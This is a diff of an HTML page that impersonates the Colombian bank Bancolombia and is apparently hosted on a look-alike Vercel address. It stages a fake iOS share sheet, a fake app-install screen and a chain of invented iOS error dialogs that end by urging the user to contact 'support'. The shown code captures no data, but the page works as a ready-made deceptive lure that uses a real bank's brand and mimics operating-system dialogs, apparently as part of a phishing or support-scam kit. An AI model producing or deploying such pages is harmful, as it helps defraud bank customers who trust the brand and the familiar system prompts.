@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Bancolombia</title>
     
     <meta name="apple-mobile-web-app-capable" content="yes">
@@ -12,114 +12,356 @@
     <link rel="apple-touch-icon" href="https://i.ibb.co/Xf8zXzR/App.png">
 
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        :root {
+            --ios-blue: #007AFF;
+            --ios-grey: #8E8E93;
+            --ios-bg: #F2F2F7;
+            --ios-card-bg: #FFFFFF;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
         
         body {
-            background-color: #000; /* Fondo negro como el icono */
+            background-color: #000; /* Fondo negro como el icono central */
             height: 100vh;
+            width: 100vw;
             display: flex;
             align-items: center;
             justify-content: center;
+            overflow: hidden;
+            position: relative;
         }
 
-        /* DISEÑO DEL ICONO CENTRAL */
-        .main-icon {
-            width: 150px;
-            height: 150px;
-            border-radius: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-
-        /* CUADRO DE DESCARGA (POPUP) */
-        .download-modal {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 90%;
-            max-width: 350px;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 20px;
+        /* DISEÑO DEL ICONO CENTRAL GRANDE (Simulado) */
+        .main-icon-container {
             display: flex;
             flex-direction: column;
             align-items: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            animation: slideUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
-            z-index: 9999;
+            justify-content: center;
+            transform: translateY(-50px);
         }
 
-        @keyframes slideUp {
-            from { bottom: -200px; opacity: 0; }
-            to { bottom: 20px; opacity: 1; }
-        }
-
-        .modal-icon {
-            width: 60px;
-            height: 60px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-        }
-
-        .modal-text {
-            text-align: center;
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        .modal-text h3 { font-size: 18px; margin-bottom: 5px; }
-        .modal-text p { font-size: 14px; color: #666; }
-
-        /* BOTONES DE PASOS */
-        .step-instruction {
-            width: 100%;
-            background: #f0f0f0;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 14px;
-            color: #333;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .main-icon {
+            width: 120px;
+            height: 120px;
+            border-radius: 28px;
+            /* REEMPLAZA ESTE ENLACE TAMBIÉN */
+            background-image: url('https://i.ibb.co/Xf8zXzR/App.png');
+            background-size: cover;
+            background-position: center;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.6);
             margin-bottom: 10px;
         }
 
-        .icon-small { width: 20px; height: 20px; }
-
-        .btn-ready {
-            margin-top: 10px;
-            color: #007AFF;
-            font-weight: 600;
-            text-decoration: none;
-            font-size: 16px;
+        .main-icon-text {
+            color: white;
+            font-size: 14px;
+            font-weight: 400;
         }
+
+        /* --- SIMULACIÓN DE DIÁLOGOS DE iOS --- */
+
+        /* Fondo oscuro para los diálogos */
+        .ios-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .ios-overlay.active { display: flex; opacity: 1; }
+
+        /* Estilo base para los cuadros de diálogo (Alerts) de iOS */
+        .ios-alert {
+            width: 270px;
+            background-color: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(15px);
+            border-radius: 14px;
+            overflow: hidden;
+            animation: iosAlertPop 0.3s ease-out;
+        }
+
+        @keyframes iosAlertPop {
+            from { transform: scale(1.1); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .ios-alert-body {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .ios-alert-title {
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: black;
+        }
+
+        .ios-alert-message {
+            font-size: 13px;
+            color: black;
+        }
+
+        .ios-alert-buttons {
+            border-top: 0.5px solid #C4C4C4;
+            display: flex;
+        }
+
+        .ios-alert-btn {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            color: var(--ios-blue);
+            font-size: 17px;
+            font-weight: 400;
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .ios-alert-btn:not(:last-child) {
+            border-right: 0.5px solid #C4C4C4;
+        }
+
+        .ios-alert-btn.bold { font-weight: 600; }
+
+        /* --- FLUJO DE LA SIMULACIÓN --- */
+
+        /* 1. Menú de Instrucciones (Fake iOS Share Sheet) */
+        .ios-share-sheet-container {
+            position: fixed;
+            bottom: 0; left: 0;
+            width: 100%;
+            display: none;
+            justify-content: center;
+            z-index: 9998;
+        }
+
+        .ios-share-sheet-container.active { display: flex; animation: slideUpShare 0.4s ease; }
+
+        @keyframes slideUpShare {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        .ios-share-sheet {
+            width: 95%;
+            max-width: 400px;
+            background-color: var(--ios-bg);
+            border-radius: 14px 14px 0 0;
+            padding: 15px;
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.2);
+        }
+
+        .share-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding-bottom: 15px;
+            border-bottom: 0.5px solid #C4C4C4;
+            margin-bottom: 15px;
+        }
+
+        .share-icon-fake {
+            width: 40px; height: 40px;
+            border-radius: 8px;
+            /* REEMPLAZA ESTE ENLACE TAMBIÉN */
+            background-image: url('https://i.ibb.co/Xf8zXzR/App.png');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .share-title-fake {
+            font-size: 16px;
+            font-weight: 600;
+            color: black;
+        }
+
+        .share-url-fake {
+            font-size: 12px;
+            color: var(--ios-grey);
+        }
+
+        .share-action {
+            background-color: var(--ios-card-bg);
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: black;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .share-action-icon {
+            font-size: 20px;
+            color: var(--ios-blue);
+        }
+
+        /* 2. Pantalla de Descarga (Fake iOS App Store download) */
+        .ios-download-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: #000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            color: white;
+            text-align: center;
+        }
+
+        .ios-download-screen.active { display: flex; }
+
+        .download-icon-sim {
+            width: 80px; height: 80px;
+            border-radius: 18px;
+            /* REEMPLAZA ESTE ENLACE TAMBIÉN */
+            background-image: url('https://i.ibb.co/Xf8zXzR/App.png');
+            background-size: cover;
+            background-position: center;
+            margin-bottom: 20px;
+        }
+
+        .download-spinner {
+            width: 30px; height: 30px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px 0;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
     </style>
 </head>
 <body>
 
-    <img src="https://i.ibb.co/Xf8zXzR/App.png" class="main-icon" alt="Bancolombia">
-
-    <div class="download-modal">
-        <img src="https://i.ibb.co/Xf8zXzR/App.png" class="modal-icon">
-        
-        <div class="modal-text">
-            <h3>Instalar Bancolombia</h3>
-            <p>Sigue estos pasos para añadir la app a tu inicio</p>
-        </div>
-
-        <div class="step-instruction">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/IOS_Share_Icon.svg/1200px-IOS_Share_Icon.svg.png" class="icon-small">
-            <span>1. Toca el botón <b>Compartir</b></span>
-        </div>
-
-        <div class="step-instruction">
-            <span style="font-size: 20px;">+</span>
-            <span>2. Dale a <b>"Agregar al inicio"</b></span>
-        </div>
-
-        <a href="#" class="btn-ready" onclick="document.querySelector('.download-modal').style.display='none'">Entendido</a>
+    <div class="main-icon-container">
+        <div class="main-icon"></div>
+        <div class="main-icon-text">Bancolombia</div>
     </div>
 
+    <div class="ios-share-sheet-container active" id="shareSheet">
+        <div class="ios-share-sheet">
+            <div class="share-header">
+                <div class="share-icon-fake"></div>
+                <div>
+                    <div class="share-title-fake">Bancolombia</div>
+                    <div class="share-url-fake">bancolombia-ios.vercel.app</div>
+                </div>
+            </div>
+            
+            <div class="share-action" onclick="startSimulatedDownload()">
+                <span>Agregar al inicio</span>
+                <span class="share-action-icon">⨁</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="ios-download-screen" id="downloadScreen">
+        <div class="download-icon-sim"></div>
+        <div class="share-title-fake" style="font-size: 18px;">Instalando</div>
+        <div class="download-spinner"></div>
+        <div class="share-url-fake">Conectando con el servidor de iOS...</div>
+    </div>
+
+    <div class="ios-overlay" id="alertOverlay">
+        
+        <div class="ios-alert" id="errorAlert" style="display: none;">
+            <div class="ios-alert-body">
+                <div class="ios-alert-title">Error de Conexión</div>
+                <div class="ios-alert-message">No se pudo establecer conexión con el servidor de iOS. El servidor actual parece estar configurado para Android.</div>
+            </div>
+            <div class="ios-alert-buttons">
+                <button class="ios-alert-btn bold" onclick="showServerSwitch()">OK</button>
+            </div>
+        </div>
+
+        <div class="ios-alert" id="switchAlert" style="display: none;">
+            <div class="ios-alert-body">
+                <div class="ios-alert-title">Cambiar de Servidor</div>
+                <div class="ios-alert-message">Para continuar en iOS, es necesario cambiar el servidor por uno compatible. ¿Deseas realizar el cambio ahora?</div>
+            </div>
+            <div class="ios-alert-buttons">
+                <button class="ios-alert-btn" onclick="closeAllAlerts()">Cancelar</button>
+                <button class="ios-alert-btn bold" onclick="simulateFinalError()">Cambiar</button>
+            </div>
+        </div>
+
+        <div class="ios-alert" id="finalErrorAlert" style="display: none;">
+            <div class="ios-alert-body">
+                <div class="ios-alert-title">Error Crítico</div>
+                <div class="ios-alert-message">Se produjo un error crítico al intentar cambiar de servidor. La instalación no puede completarse en este dispositivo. Por favor, contacte con soporte técnico.</div>
+            </div>
+            <div class="ios-alert-buttons">
+                <button class="ios-alert-btn bold" onclick="location.reload()">Soporte</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // Funciones para controlar el flujo de la simulación
+
+        const shareSheet = document.getElementById('shareSheet');
+        const downloadScreen = document.getElementById('downloadScreen');
+        const alertOverlay = document.getElementById('alertOverlay');
+        const errorAlert = document.getElementById('errorAlert');
+        const switchAlert = document.getElementById('switchAlert');
+        const finalErrorAlert = document.getElementById('finalErrorAlert');
+
+        // Paso 1: Inicia la descarga simulada
+        function startSimulatedDownload() {
+            shareSheet.classList.remove('active');
+            downloadScreen.classList.add('active');
+
+            // Simula 3 segundos de descarga/conexión
+            setTimeout(() => {
+                showInitialError();
+            }, 3500);
+        }
+
+        // Paso 2: Muestra el error inicial de servidor
+        function showInitialError() {
+            downloadScreen.classList.remove('active');
+            alertOverlay.classList.add('active');
+            errorAlert.style.display = 'block';
+        }
+
+        // Paso 3: Al dar OK, muestra la opción de cambiar servidor
+        function showServerSwitch() {
+            errorAlert.style.display = 'none';
+            switchAlert.style.display = 'block';
+        }
+
+        // Paso 4: Al dar "Cambiar", simula un error crítico final
+        function simulateFinalError() {
+            switchAlert.style.display = 'none';
+            finalErrorAlert.style.display = 'block';
+        }
+
+        // Función auxiliar para cerrar todo
+        function closeAllAlerts() {
+            alertOverlay.classList.remove('active');
+            // Oculta todos los alerts individuales para reiniciar
+            [errorAlert, switchAlert, finalErrorAlert].forEach(alert => alert.style.display = 'none');
+        }
+
+    </script>
 </body>
 </html>
